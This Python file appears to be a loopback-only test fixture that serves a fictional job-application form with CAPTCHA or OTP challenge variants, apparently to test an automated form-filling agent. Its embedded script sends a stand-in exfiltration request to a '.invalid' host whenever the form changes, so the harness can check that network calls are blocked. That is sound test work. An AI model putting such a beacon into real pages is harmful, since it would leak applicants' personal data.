from __future__ import annotations

import argparse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlsplit


def synthetic_ats_html(challenge: str) -> bytes:
    challenge_markup = {
        "captcha": (
            '<div id="challenge" role="status" data-human-action="captcha">Complete CAPTCHA</div>'
        ),
        "otp": '<div id="challenge" role="status" data-human-action="otp">Enter OTP</div>',
        "none": '<div id="challenge" role="status" hidden>No challenge</div>',
    }[challenge]
    return f"""<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>Synthetic ATS</title></head>
<body>
<main>
  <h1>Fictional application</h1>
  <form method="post">
    <label for="first-name">First name</label>
    <input id="first-name" data-field-key="first_name" required>
    <label for="email">Email</label>
    <input id="email" type="email" data-field-key="email" required>
    <label for="cv">CV</label>
    <input id="cv" type="file" data-field-key="cv" required>
    {challenge_markup}
    <button type="submit" data-final-submit>Submit application</button>
  </form>
</main>
<script>
if (localStorage.getItem('syntheticHumanActionCompleted') === 'true') {{
  document.getElementById('challenge').hidden = true;
}}
document.querySelector('form').addEventListener('change', () => {{
  fetch(window.location.href, {{method: 'POST', body: 'must-be-blocked'}}).catch(() => {{}});
  fetch('https://network-must-be-blocked.invalid/exfiltrate').catch(() => {{}});
}});
</script>
</body>
</html>
""".encode()


SYNTHETIC_ATS_HTML = synthetic_ats_html("captcha")


class SyntheticATSHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        parsed = urlsplit(self.path)
        values = parse_qs(parsed.query, keep_blank_values=True)
        challenge = values.get("challenge", ["captcha"])
        if (
            parsed.path != "/application"
            or set(values) - {"challenge"}
            or len(challenge) != 1
            or challenge[0] not in {"none", "captcha", "otp"}
        ):
            self.send_error(404)
            return
        content = synthetic_ats_html(challenge[0])
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def log_message(self, _format: str, *args: object) -> None:
        del args


def serve(host: str = "127.0.0.1", port: int = 8090) -> None:
    if host not in {"127.0.0.1", "localhost"}:
        raise ValueError("the synthetic ATS fixture must bind to loopback")
    server = ThreadingHTTPServer((host, port), SyntheticATSHandler)
    try:
        server.serve_forever()
    finally:
        server.server_close()


def main() -> int:
    parser = argparse.ArgumentParser(description="Run the loopback-only synthetic ATS fixture")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8090)
    args = parser.parse_args()
    serve(args.host, args.port)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
